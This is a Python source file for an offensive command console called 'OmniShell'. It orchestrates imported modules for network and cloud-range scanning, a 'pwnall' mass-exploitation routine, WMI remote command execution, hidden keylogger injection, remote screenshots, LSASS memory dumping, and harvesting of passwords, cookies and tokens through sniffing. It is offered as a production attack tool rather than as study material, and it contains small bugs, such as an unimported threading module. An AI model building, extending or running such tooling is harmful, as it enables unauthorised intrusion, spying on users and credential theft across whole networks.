import asyncio
import sys
import os
import socket
import time
from colorama import Fore, Style, init
from typing import Dict, Any, List
from datetime import datetime

from advanced_scanner import AdvancedNetworkScanner
from lateral_movement import AdvancedCommandCenter
from exploit_engine import UniversalNetworkAccess
from remote_control import AgentlessControl
from passive_intel import AgentlessIntelligence

# Initialize Colorama
init(autoreset=True)

class AMMOEngine:
    """Asynchronous Multi-threaded Modular Orchestrator (AMMO v2)"""
    def __init__(self):
        self.tasks = []
        self.concurrency_limit = 2000
        self.semaphore = asyncio.Semaphore(self.concurrency_limit)

    async def execute_task(self, coro):
        async with self.semaphore:
            return await coro

class HackerSounds:
    @staticmethod
    def alert(): print(f"{Fore.RED}[!] SOUND: ALERT")
    @staticmethod
    def network_pulse(): print(f"{Fore.CYAN}[*] SOUND: NETWORK PULSE")
    @staticmethod
    def exploit_success(): print(f"{Fore.GREEN}[+] SOUND: EXPLOIT SUCCESS")
    @staticmethod
    def connection_established(): print(f"{Fore.BLUE}[*] SOUND: CONNECTION ESTABLISHED")

class MatrixEffects:
    @staticmethod
    def digital_rain():
        print(f"{Fore.GREEN}[*] VISUAL: DIGITAL RAIN")

class OmniShell:
    def __init__(self):
        self.version = "7.1.005-STABLE"
        self.ammo = AMMOEngine()
        self.targets = []
        self.active_sessions = {}

        # Initialize Functional Engines - PRODUCTION
        self.scanner = AdvancedNetworkScanner()
        self.lateral = AdvancedCommandCenter()
        self.exploiter = UniversalNetworkAccess()
        self.control = AgentlessControl()
        self.intel = AgentlessIntelligence()
        
        # State tracking for the operator
        self.last_target = None
        self.creds = {
            "user": "Administrator",
            "pass": "",
            "domain": "."
        }
        
        self.intel.add_activity_callback(self._on_intel_event)
        
        # Wire modules together for autonomous chains
        self.lateral.set_modules(discovery=self.scanner, intel=self.intel, control=self.control)

    def display_banner(self):
        """Ultra modern intelligence agency banner with live network info."""
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        
        import urllib.request
        try:
            with urllib.request.urlopen('https://api.ipify.org', timeout=2) as f:
                public_ip = f.read().decode('utf8')
        except:
            public_ip = 'OFFLINE'

        banner_txt = [
            "██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
            "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
            "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
            "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
            "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
        ]

        print(f"{Fore.LIGHTBLACK_EX}╔{'═'*98}╗")
        for line in banner_txt:
            print(f"{Fore.CYAN}║ {line.center(96)} ║")
        print(f"{Fore.LIGHTBLACK_EX}╠{'═'*98}╣")
        print(f"{Fore.LIGHTBLACK_EX}║ {Fore.LIGHTGREEN_EX}▸ SYSTEM: {sys.platform.upper():<10} {Fore.LIGHTGREEN_EX}▸ HOST: {hostname:<15} {Fore.LIGHTGREEN_EX}▸ LAN: {local_ip:<15} {Fore.LIGHTGREEN_EX}▸ WAN: {public_ip:<15} ║")
        print(f"{Fore.LIGHTBLACK_EX}║ {Fore.MAGENTA}▸ VERSION: {self.version:<10} {Fore.MAGENTA}▸ clearance: TOP_SECRET {'':<14} {Fore.RED}▸ SECURITY: GOVT_OPS_ONLY ║")
        print(f"{Fore.LIGHTBLACK_EX}╚{'═'*98}╝")
        print(f"{Fore.YELLOW}[i] Terminal Ready. Command Interface Active.\n")

    def _on_intel_event(self, event):
        """Handles background intelligence events."""
        if event.get("type") == "credential":
            print(f"\n{Fore.MAGENTA}[INTEL] ALERT: Credential harvested from {event.get('source')}")

    async def start(self):
        """Starts the interactive shell loop asynchronously."""
        self.display_banner()
        while True:
            cmd = await asyncio.to_thread(input, f"{Fore.CYAN}omniscence> {Style.RESET_ALL}")
            await self.handle_command(cmd)

    async def handle_command(self, cmd_input: str):
        parts = cmd_input.split()
        if not parts: return
        
        cmd = parts[0].lower()
        args = parts[1:]

        if cmd in ["exit", "quit"]:
            print(f"{Fore.YELLOW}Shutting down AMMO engine...")
            sys.exit(0)
        
        # --- SCANNING CATEGORY ---
        elif cmd in ["globalscan", "auto"]:
            print(f"{Fore.GREEN}[*] Initiating ULTRAMAX Global Network Discovery...")
            self.targets = await asyncio.to_thread(self.exploiter.ultramax_global_scan)
            print(f"{Fore.GREEN}[+] Scan Complete. {len(self.targets)} active targets identified.")

        elif cmd == "scan":
            target_range = args[0] if args else self.scanner.network_range
            print(f"{Fore.CYAN}[*] Scanning range: {target_range}...")
            results = await asyncio.to_thread(self.exploiter.discover_all_devices, target_range)
            self.targets = results
            print(f"{Fore.GREEN}[+] Discovery complete. Found {len(results)} hosts.")

        elif cmd == "traceroute":
            if not args: return
            print(f"{Fore.CYAN}[*] Mapping path to {args[0]}...")
            hops = await asyncio.to_thread(self.scanner.traceroute_with_services, args[0])
            for hop in hops:
                print(f"  {hop.hop_num:<2} | {hop.ip or '*':<15} | {hop.rtt or 0.0:>6.1f} ms | {hop.asn}")

        elif cmd == "vpn":
            print(f"{Fore.CYAN}[*] Auditing gateway for VPN endpoints...")
            info = await asyncio.to_thread(self.scanner.discover_vpn_networks)
            for v in info:
                print(f"  [+] DETECTED: {v['ip']}:{v['port']} ({v['type']})")

        elif cmd == "external-ip":
            import urllib.request
            try:
                ext = urllib.request.urlopen('https://api.ipify.org').read().decode()
                print(f"{Fore.GREEN}[+] External IP: {ext}")
            except: print(f"{Fore.RED}[!] Offline.")

        elif cmd == "targets":
            self.list_targets()

        # --- ATTACK CATEGORY ---
        elif cmd in ["pwnall", "attack"]:
            if not self.targets:
                print(f"{Fore.RED}[!] No targets discovered. Execute 'globalscan' to map the environment.")
                return
            
            print(f"{Fore.RED}{Style.BRIGHT}[!] INITIATING AUTONOMOUS NETWORK DOMINATION SEQUENCE...")
            MatrixEffects.digital_rain()
            HackerSounds.alert()
            
            # Phase 1: Real pwn_all_devices chain
            results = await asyncio.to_thread(self.exploiter.pwn_all_devices)
            print(f"{Fore.GREEN}{Style.BRIGHT}[+] EXPLOITATION COMPLETE. COMPROMISED: {len(results['exploited'])} hosts.")
            HackerSounds.exploit_success()

        elif cmd == "pwn":
            if not args: return
            print(f"{Fore.RED}[*] Launching precision exploit on {args[0]}...")
            result = await asyncio.to_thread(self.exploiter.pwn_target, args[0])
            if result.get("success"):
                print(f"{Fore.GREEN}[+] ACCESS GRANTED: {result.get('method')}")
                self.last_target = args[0]
            else:
                print(f"{Fore.RED}[!] Exploit failed. Target may be patched.")

        elif cmd == "smbghost":
            if not args: return
            res = await asyncio.to_thread(self.control.check_smbghost, args[0])
            print(f"{Fore.YELLOW}[*] SMBGhost Result: {'VULNERABLE' if res['vulnerable'] else 'Safe'}")

        elif cmd == "zerologon":
            if not args: return
            res = await asyncio.to_thread(self.control.check_zerologon, args[0])
            print(f"{Fore.YELLOW}[*] Zerologon Result: {res['details']}")

        # --- REMOTE CONTROL CATEGORY ---
        elif cmd == "exec":
            if not args: return
            target = self.last_target if self.last_target else args[0]
            command = " ".join(args[1:]) if self.last_target else " ".join(args[1:])
            print(f"{Fore.CYAN}[*] Executing on {target}...")
            res = await asyncio.to_thread(self.control.wmi_exec, target, self.creds['user'], self.creds['pass'], command)
            print(f"{Fore.WHITE}{res.get('output', 'No Output')}")

        elif cmd == "screen":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.MAGENTA}[*] Capturing remote desktop of {target}...")
            path = await asyncio.to_thread(self.control.remote_screenshot, target, self.creds['user'], self.creds['pass'])
            if path: print(f"{Fore.GREEN}[+] Screenshot saved: {path}")

        elif cmd == "keylog":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Injecting hidden keylogger on {target}...")
            await asyncio.to_thread(self.control.wmi_keylogger_start, target, self.creds['user'], self.creds['pass'])
            print(f"{Fore.GREEN}[+] Keylogger active. Intercepting keystrokes...")

        elif cmd in ["sysinfo", "systeminfo"]:
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.CYAN}[*] Extracting system properties from {target}...")
            info = await asyncio.to_thread(self.control.get_full_system_info, target, self.creds['user'], self.creds['pass'])
            if info.get('success'):
                si = info['system_info']
                print(f"  OS: {si.get('os_name')} ({si.get('os_architecture')})")
                print(f"  CPU: {si.get('processor')} | RAM: {si.get('ram_total')}MB")

        # --- DATA EXTRACTION CATEGORY ---
        elif cmd == "cloudscan":
            provider = args[0] if args else "aws"
            print(f"{Fore.BLUE}[*] Scanning public {provider.upper()} ranges...")
            cloud_hosts = await asyncio.to_thread(self.scanner.scan_public_ranges, provider)
            print(f"{Fore.GREEN}[+] Identified {len(cloud_hosts)} potential cloud targets.")

        elif cmd == "harvest":
            if not args:
                print(f"{Fore.RED}[!] Usage: harvest <ip> [user] [pass]")
                return
            
            target = args[0]
            user = args[1] if len(args) > 1 else "Administrator"
            pwd = args[2] if len(args) > 2 else ""
            print(f"{Fore.MAGENTA}[*] Harvesting credentials and vault tokens from {target}...")
            data = await asyncio.to_thread(self.control.extract_all_data, target, user, pwd)
            print(f"{Fore.GREEN}[+] Harvest complete. Recovery: {len(data.get('credentials', {}))} vault items.")

        elif cmd == "lsass-dump":
            target = args[0] if args else self.last_target
            if not target: return
            print(f"{Fore.RED}[*] Triggering LSASS memory dump on {target} (Minidump method)...")
            res = await asyncio.to_thread(self.control.lsass_dump, target, self.creds['user'], self.creds['pass'])
            if res.get('success'): print(f"{Fore.GREEN}[+] Dump complete: {res.get('unc')}")
            else: print(f"{Fore.RED}[!] Failed: {res.get('error')}")

        # --- PASSIVE INTELLIGENCE ---
        elif cmd == "sniff":
            print(f"{Fore.CYAN}[*] Initializing passive traffic interceptor...")
            threading.Thread(target=self.intel.start_sniffing, daemon=True).start()
            print(f"{Fore.GREEN}[+] Sniffer active. Type 'creds' to view intercepted tokens.")

        elif cmd == "creds":
            captured = self.intel.get_credentials()
            print(f"\n{Fore.MAGENTA}CAPTURED CREDENTIALS / TOKENS:")
            for c in captured:
                print(f"  [{c['time'].strftime('%H:%M:%S')}] {c['source']} -> {c['data']}")

        # --- UTILITY ---
        elif cmd == "setcreds":
            if len(args) < 2: return
            self.creds['user'], self.creds['pass'] = args[0], args[1]
            if len(args) > 2: self.creds['domain'] = args[2]
            print(f"{Fore.GREEN}[+] Credentials updated for sessions.")

        elif cmd == "select":
            if not args: return
            try:
                idx = int(args[0])
                self.last_target = self.targets[idx].ip
                print(f"{Fore.GREEN}[+] Current target set to: {self.last_target}")
            except: print(f"{Fore.RED}[!] Invalid index.")

        elif cmd == "help":
            self.show_help()
            
        else:
            print(f"{Fore.RED}[?] Unknown command: {cmd}")

    async def run_module(self, mod_id: str, function: str, args: list):
        """Production module runner."""
        print(f"{Fore.BLUE}[M] Executing module {mod_id}.{function}({args})")
        # Real module execution via dynamic dispatch
        if mod_id == '1' and function == 'auto_scan':
            self.targets = await self.scanner.auto_scan()
        print(f"{Fore.GREEN}[+] Module complete")

    def list_targets(self):
        if not self.targets:
            print(f"{Fore.YELLOW}[!] No targets discovered yet. Run 'globalscan'.")
        else:
            print(f"\n{Fore.CYAN}DISCOVERED TARGETS:")
            print(f"{Fore.CYAN}{'='*60}")
            for idx, t in enumerate(self.targets):
                ip = getattr(t, 'ip', str(t))
                os_type = getattr(t, 'os', 'Unknown OS')
                status = "COMPROMISED" if getattr(t, 'is_compromised', False) else "ACTIVE"
                print(f"  [{idx}] {ip:<15} | {os_type:<15} | {status}")

    def show_help(self):
        print(f"\n{Fore.WHITE}{Style.BRIGHT}COMMAND CENTER - OPERATIONS MANUAL")
        print(f"{Fore.LIGHTBLACK_EX}{'='*80}")
        print(f"{Fore.CYAN}RECONNAISSANCE:")
        print("  globalscan            - Autonomous discovery of all subnets and mobile hotspots")
        print("  scan <cidr>           - Standard network scan")
        print("  traceroute <ip>       - Path mapping with service fingerprinting")
        print("  vpn                   - Detect gateway VPN endpoints")
        print("  targets               - List discovered assets")
        print("  select <idx>          - Set current operational target")
        
        print(f"\n{Fore.RED}EXPLOITATION:")
        print("  attack / pwnall       - Launch global autonomous exploitation sequence")
        print("  pwn <ip>              - Targeted unauthenticated access attempt")
        print("  smbghost / zerologon  - Specific CVE vulnerability probes")
        
        print(f"\n{Fore.MAGENTA}REMOTE CONTROL & DATA:")
        print("  exec <cmd>            - Execute command via WMI/SSH (uses current target)")
        print("  screen                - Capture live remote desktop")
        print("  keylog                - Start background keystroke interceptor")
        print("  harvest               - Deep extraction of passwords, cookies, and tokens")
        print("  lsass-dump            - Perform remote memory dump for hash recovery")
        print("  sniff / creds         - Passive network traffic credential harvesting")
        print(f"{Fore.LIGHTBLACK_EX}{'='*80}\n")

async def main_loop():
    shell = OmniShell()
    shell.display_banner()
    while True:
        try:
            cmd = input(f"{Fore.CYAN}omniscence> {Style.RESET_ALL}")
            await shell.handle_command(cmd)
        except KeyboardInterrupt:
            print("\nUse 'exit' to quit.")
        except Exception as e:
            print(f"{Fore.RED}Error: {e}")

if __name__ == "__main__":
    asyncio.run(main_loop())